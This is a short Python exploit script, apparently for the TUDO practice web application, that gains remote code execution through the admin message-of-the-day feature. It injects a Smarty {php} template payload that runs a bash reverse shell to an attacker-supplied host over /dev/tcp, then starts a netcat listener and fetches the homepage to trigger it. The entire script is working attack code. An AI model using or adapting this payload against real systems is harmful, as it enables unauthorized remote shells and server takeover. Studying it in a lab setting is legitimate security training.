#!/usr/bin/python3

# @title  TUDO RCE #1
# @author William Moody
# @date   10.03.2021

import requests
import sys
import subprocess
import time

if len(sys.argv) != 4:
	print("usage: %s TARGET HOST ADMIN_PHPSESSID"%sys.argv[0])
	sys.exit(-1)

target    = sys.argv[1]
host      = sys.argv[2]
phpsessid = sys.argv[3]

lport = 9001

def set_motd(m):
	c = {"PHPSESSID":phpsessid}
	d = {"message":m}
	r = requests.post("http://%s/admin/update_motd.php"%target,data=d,cookies=c)
	return "Message set!" in r.text

def get_homepage():
	c = {"PHPSESSID":phpsessid}
	r = requests.get("http://%s/"%target,cookies=c)

if set_motd("{php}exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\");{/php}"%(host,lport)):
	print("[+] Changed MoTD!")
else:
	print("[-] Failed while setting MoTD.")
	sys.exit(-1)

print("[*] Starting reverse shell...")
subprocess.Popen(["nc","-nvlp","%d"%lport])
time.sleep(1)
get_homepage()

# Keep shell open
while True:
	pass
